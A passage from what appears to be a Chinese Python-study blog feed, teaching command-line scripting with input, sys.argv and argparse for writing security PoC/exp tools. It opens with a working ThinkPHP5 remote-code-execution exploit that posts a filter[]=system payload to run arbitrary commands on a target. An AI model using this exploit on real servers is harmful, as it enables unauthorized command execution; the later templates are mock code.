sys</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    <span class="comment"># 1.发请求</span></span><br><span class="line">    full_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/index.php?s=captcha&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.0.60:8080&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.0.60:8080/index.php?s=captcha&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,ja;q=0.8&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    data1 = &#123;<span class="string">&quot;_method&quot;</span>: <span class="string">&quot;__construct&quot;</span>, <span class="string">&quot;filter[]&quot;</span>: <span class="string">&quot;phpinfo&quot;</span>, <span class="string">&quot;method&quot;</span>: <span class="string">&quot;get&quot;</span>, <span class="string">&quot;server[REQUEST_METHOD]&quot;</span>: <span class="string">&quot;-1&quot;</span>&#125;</span><br><span class="line">    data2 = &#123;<span class="string">&quot;_method&quot;</span>: <span class="string">&quot;__construct&quot;</span>, <span class="string">&quot;filter[]&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;method&quot;</span>: <span class="string">&quot;get&quot;</span>, <span class="string">&quot;server[REQUEST_METHOD]&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;cmd&#125;</span>&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response1 = requests.post(full_url, headers=headers, data=data1,verify=<span class="literal">False</span>, timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        response2 = requests.post(full_url, headers=headers, data=data2,verify=<span class="literal">False</span>, timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;url&#125;</span> 请求失败&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 2.判断是否存在漏洞</span></span><br><span class="line">    <span class="keyword">if</span> response1.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;PHP Extension Build&quot;</span> <span class="keyword">in</span> response1.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]<span class="subst">&#123;url&#125;</span> 存在远程代码执行漏洞&quot;</span>)</span><br><span class="line">        <span class="comment"># 3.回显命令执行的结果给用户</span></span><br><span class="line">        res = response2.text.split(<span class="string">&quot;&lt;!DOCTYPE html&gt;&quot;</span>,<span class="number">1</span>)[<span class="number">0</span>].strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]<span class="subst">&#123;cmd&#125;</span>命令执行的回显为:\n<span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;url&#125;</span> 不存在远程代码执行漏洞&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string"> _   _     _       _          _          ____                 </span></span><br><span class="line"><span class="string">| |_| |__ (_)_ __ | | ___ __ | |__  _ __| ___|   _ __ ___ ___ </span></span><br><span class="line"><span class="string">| __| &#x27;_ \| | &#x27;_ \| |/ / &#x27;_ \| &#x27;_ \| &#x27;_ \___ \  | &#x27;__/ __/ _ \\</span></span><br><span class="line"><span class="string">| |_| | | | | | | |   &lt;| |_) | | | | |_) |__) | | | | (_|  __/</span></span><br><span class="line"><span class="string"> \__|_| |_|_|_| |_|_|\_\ .__/|_| |_| .__/____/  |_|  \___\___|</span></span><br><span class="line"><span class="string">                       |_|         |_|  </span></span><br><span class="line"><span class="string">                                                version: 0.0.1</span></span><br><span class="line"><span class="string">                                                author:   xxx</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="comment"># 使用argparse去解析命令行传来的参数</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;thinkphp5 rce exp&quot;</span>,</span><br><span class="line">                                     formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">                                     epilog=textwrap.dedent(<span class="string">&#x27;&#x27;&#x27;example:</span></span><br><span class="line"><span class="string">        python3 tp5exp.py -u http://192.168.1.108 -c whoami</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>))</span><br><span class="line">    <span class="comment"># 添加参数</span></span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;input a url&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>, dest=<span class="string">&quot;cmd&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;input a cmd&quot;</span>,default=<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    <span class="comment"># 把参数的值解析到对象中</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main(args.url,args.cmd)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（十八）</title>
      <link href="/2022/08/03/python_eighteen/"/>
      <url>/2022/08/03/python_eighteen/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403135819468.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章记录的是Python命令行编程知识。&#x3D;&#x3D;</p><h1 id="一、命令行编程"><a href="#一、命令行编程" class="headerlink" title="一、命令行编程"></a>一、命令行编程</h1><p>什么是命令行编程呢？<br>通过命令行的方式和用户交互，接收用户输入的数据，然后处理，结果再次通过命令行反馈给用户。<br>对于安全人员编写poc和exp，你会发现很多python工具都是命令行版本的。<br>##1、input接收<br>在之前的函数中，已经介绍过input函数了，这里我们直接开始案例。<br>如果我们要编写一个RCE漏洞的exp，可以先构造我们的思路<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;请输入url: &quot;</span>).strip()</span><br><span class="line">cmd = <span class="built_in">input</span>(<span class="string">&quot;请输入你要执行的系统命令: &quot;</span>).strip()</span><br><span class="line"><span class="comment"># 简易模仿代码</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;正在对<span class="subst">&#123;url&#125;</span> 网站执行 <span class="subst">&#123;cmd&#125;</span> 这条系统命令&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;命令执行完成 , 命令的回显: root&quot;</span>)</span><br></pre></td></tr></table></figure><p>稍微美化一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot;cve-2022-4346-rce</span></span><br><span class="line"><span class="string">使用方法 : 根据提示依次输入url和命令&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;请输入url: &quot;</span>).strip()</span><br><span class="line">    cmd = <span class="built_in">input</span>(<span class="string">&quot;请输入你要执行的系统命令: &quot;</span>).strip()</span><br><span class="line">    <span class="comment"># 简易模仿代码</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在对<span class="subst">&#123;url&#125;</span> 网站执行 <span class="subst">&#123;cmd&#125;</span> 这条系统命令&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;命令执行完成,命令的回显: root&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="2、sys模块"><a href="#2、sys模块" class="headerlink" title="2、sys模块"></a>2、sys模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sys.argv)  <span class="comment"># 接收py脚本传进来的参数 , 返回一个列表 , 一般用来获取命令行参数</span></span><br><span class="line"><span class="comment"># 我们编写poc可以通过它来获取用户传递过来的url , 要执行的命令等</span></span><br></pre></td></tr></table></figure><p>使用sys模块优化一下，这个时候接收参数，就不需要input接收了，而是通过sys.argv<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    <span class="comment"># 简易模仿代码</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;真正具体对指定url执行命令的代码&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在对<span class="subst">&#123;url&#125;</span> 网站执行<span class="subst">&#123;cmd&#125;</span> 这条系统命令&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;命令执行完成,命令的回显: root&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot;welcome use cve-2022-4346-rce</span></span><br><span class="line"><span class="string">使用方法 : python3 cve-2022-4346-rce.py http://www.mhx.com id\n&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        cmd = sys.argv[<span class="number">2</span>]</span><br><span class="line">        main(url, cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入参数有误,请按照提示输入&quot;</span>)</span><br></pre></td></tr></table></figure><p>退出函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.exit(<span class="number">0</span>)     <span class="comment"># 一旦执行这行代码 , 程序会直接退出 , 安全退出</span></span><br><span class="line">sys.exit(<span class="number">1</span>)     <span class="comment"># 一旦执行这行代码 , 程序会直接退出 , 报错退出</span></span><br></pre></td></tr></table></figure><h1 id="二、argparse模块"><a href="#二、argparse模块" class="headerlink" title="二、argparse模块"></a>二、argparse模块</h1><p>argparse模块是python标准库中推荐的命令行解析模块，也是一个内置模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令行参数可以提升脚本的灵活性，更加通用。完成参数解析一般用到getopt, optparse和argparse，其中argparse 是基于 optparse , 在Python3<span class="number">.2</span>新推出的命令行参数解析模块 , 比较主流</span><br></pre></td></tr></table></figure><p>特点：</p><ul><li>支持可选参数</li><li>支持子命令</li><li>支持重复参数个数统计</li><li>更加友好的使用提示<br>该模块不但可以用来写poc&#x2F;exp，还可以写一些命令行的渗透测试工具。<br>初步：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="comment"># 实例化一个对象 , 并添加命令行的描述信息,一般在脚本中用来介绍脚本是干嘛的</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;这是脚本的提示信息&quot;</span>)</span><br><span class="line"><span class="comment"># 调用parse_args方法</span></span><br><span class="line">parser.parse_args()</span><br></pre></td></tr></table></figure><p>直接运行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接运行</span></span><br><span class="line">D:\python3 argparse模块.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用-h参数</span></span><br><span class="line">D:\python3 argparse模块.py -h</span><br><span class="line">usage: argparse模块.py [-h]</span><br><span class="line"></span><br><span class="line">这是脚本的提示信息</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>  show this <span class="built_in">help</span> message <span class="keyword">and</span> exit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用一个不存在的参数</span></span><br><span class="line">D:\python3 argparse模块.py -a</span><br><span class="line">usage: argparse模块.py [-h]</span><br><span class="line">argparse模块.py: error: unrecognized arguments: -a</span><br></pre></td></tr></table></figure><ul><li>在没有任何选项 (参数) 的情况下运行脚本不会在标准输出显示任何内容。这没有什么用处。</li><li>第二次运行开始展现出 <code>argparse</code> 模块的作用。我们几乎什么也没有做，但已经得到一条很好的帮助信息。</li><li><code>--help</code> 选项，也可缩写为 <code>-h</code>，是唯一 一个可以直接使用的选项（即不需要指定该选项的内容）。指定任何内容都会导致错误。即便如此，我们也能直接得到一条有用的用法信息</li></ul><h2 id="1、位置参数"><a href="#1、位置参数" class="headerlink" title="1、位置参数"></a>1、位置参数</h2><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line"><span class="comment"># 添加一个参数,参数名叫做url</span></span><br><span class="line">parser.add_argument(<span class="string">&quot;url&quot;</span>)</span><br><span class="line"><span class="comment"># 解析参数,得到一个args对象</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="comment"># 通过 对象.参数名 调用</span></span><br><span class="line"><span class="built_in">print</span>(args.url)</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">D:\python3 argparse模块.py  http://XXX.com</span><br><span class="line">http://XXX.com</span><br><span class="line"></span><br><span class="line">D:\python3 argparse模块.py  -h</span><br><span class="line">usage: argparse模块.py [-h] url</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  url</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>  show this <span class="built_in">help</span> message <span class="keyword">and</span> exit</span><br></pre></td></tr></table></figure><p>虽然有个参数的传入 , 但是多多少少不是我们想要的 , 但是不要急 , 一般位置参数是用来做工具中必须传入的参数</p><p>一般都不是用来接收值的 , 而是指定工具如何运行的 , 比如<br>scan 位置参数 可以通过这个参数指定工具运行扫描功能<br>关于添加位置参数 , 可以给参数设置一些属性 , 比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&quot;url&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input a url&quot;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line"><span class="comment"># 默认参数接收的值都是字符串类型, 如果需要其他类型 , 需要使用type指定</span></span><br></pre></td></tr></table></figure><p>使用-h参数 , 可以查看参数的help属性的值<br>##2、可选参数<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;--url&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input a url&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="comment"># 输入args.url的值</span></span><br><span class="line"><span class="built_in">print</span>(args.url)  <span class="comment"># 默认不指定值的时候为None</span></span><br></pre></td></tr></table></figure><p>运行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 没有参数直接运行</span></span><br><span class="line">D:\python3 argparse模块.py</span><br><span class="line"><span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置参数值</span></span><br><span class="line">D:\python3 argparse模块.py --url http://www.XXX.com</span><br><span class="line">http://www.XXX.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看帮助信息</span></span><br><span class="line">D:\python3 argparse模块.py -h</span><br><span class="line">usage: argparse模块.py [-h] [--url URL]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>  show this <span class="built_in">help</span> message <span class="keyword">and</span> exit</span><br><span class="line">  --url URL   <span class="built_in">input</span> a url</span><br></pre></td></tr></table></figure><h2 id="3、短选项"><a href="#3、短选项" class="headerlink" title="3、短选项"></a>3、短选项</h2><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input a url&quot;</span>,)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(args.url)</span><br></pre></td></tr></table></figure><p>运行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接运行</span></span><br><span class="line">D:\&gt;python3 argparse模块.py</span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="comment"># 使用短选项</span></span><br><span class="line">D:\python3 argparse模块.py -u http://www.mhx.com</span><br><span class="line">http://www.mhx.com</span><br><span class="line"><span class="comment"># 使用长选项</span></span><br><span class="line">D:\python3 argparse模块.py --url  http://www.mhx.com</span><br><span class="line">http://www.mhx.com</span><br><span class="line"><span class="comment"># 查看帮助信息</span></span><br><span class="line">D:\python3 argparse模块.py -h</span><br><span class="line">usage: argparse模块.py [-h] [-u URL]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>         show this <span class="built_in">help</span> message <span class="keyword">and</span> exit</span><br><span class="line">  -u URL, --ver VER  increase output ver</span><br></pre></td></tr></table></figure><p>有一些需要注意的属性：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`dest` 通常会作为 `add_argument()`的第一个参数 , 对于可选参数来说 , 默认属性名就是参数名 , 如果有`dest`指定则是`dest值`</span><br><span class="line"></span><br><span class="line">如果你想给一个参数设置一个默认值 , 可以通过`default=<span class="number">1</span>`关键字实现</span><br><span class="line">当 `action=<span class="string">&quot;store&quot;</span>`也就是默认的 , 是接收参数存进来的值 , 并存储</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-z&quot;</span>,<span class="string">&quot;--zzz&quot;</span>, dest=<span class="string">&quot;ggg&quot;</span>,<span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1</span>,<span class="built_in">help</span>=<span class="string">&quot;display a square of a given number&quot;</span>,action=<span class="string">&quot;store&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(args.zzz)  # 报错 , 因为指定了dest关键字 , 一般情况下参数名</span></span><br><span class="line"><span class="built_in">print</span>(args.ggg)</span><br></pre></td></tr></table></figure><p>运行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接运行 , 打印默认值</span></span><br><span class="line">D:\python3 argparse模块.py</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用短选项指定参数的值 , 注意使用依然是-z</span></span><br><span class="line">D:\python3 argparse模块.py -z <span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="comment"># 查看帮助</span></span><br><span class="line">D:\python3 argparse模块.py -h</span><br><span class="line">usage: argparse模块.py [-h] [-z GGG]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>         show this <span class="built_in">help</span> message <span class="keyword">and</span> exit</span><br><span class="line">  -z GGG, --zzz GGG  display a square of a given number</span><br></pre></td></tr></table></figure><p>该模块完整手册请见 : <a href="https://docs.python.org/zh-cn/3.8/library/argparse.html">https://docs.python.org/zh-cn/3.8/library/argparse.html</a><br>##4、小模板<br>下面是一个小模板，编写的时候可以先套用，最好是有自己的风格</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    <span class="comment"># 简易模仿代码</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;真正具体对指定url执行命令的代码&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在对<span class="subst">&#123;url&#125;</span> 网站执行<span class="subst">&#123;cmd&#125;</span> 这条系统命令&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;命令执行完成,命令的回显: root&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string"> _   _     _       _          _          ____                 </span></span><br><span class="line"><span class="string">| |_| |__ (_)_ __ | | ___ __ | |__  _ __| ___|   _ __ ___ ___ </span></span><br><span class="line"><span class="string">| __| &#x27;_ \| | &#x27;_ \| |/ / &#x27;_ \| &#x27;_ \| &#x27;_ \___ \  | &#x27;__/ __/ _ \\</span></span><br><span class="line"><span class="string">| |_| | | | | | | |   &lt;| |_) | | | | |_) |__) | | | | (_|  __/</span></span><br><span class="line"><span class="string"> \__|_| |_|_|_| |_|_|\_\ .__/|_| |_| .__/____/  |_|  \___\___|</span></span><br><span class="line"><span class="string">                       |_|         |_|  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;thinkphp5 rce exp&#x27;</span>, formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">                                     epilog=textwrap.dedent(<span class="string">&#x27;&#x27;&#x27;example:</span></span><br><span class="line"><span class="string">        python3 cve-2022-4334-rce.py -u http://192.168.1.108 -c id</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>))</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot; example: http://www.xxx.com&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>, dest=<span class="string">&quot;cmd&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;whoami&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;default=whoami example: id&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main(args.url, args.cmd)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
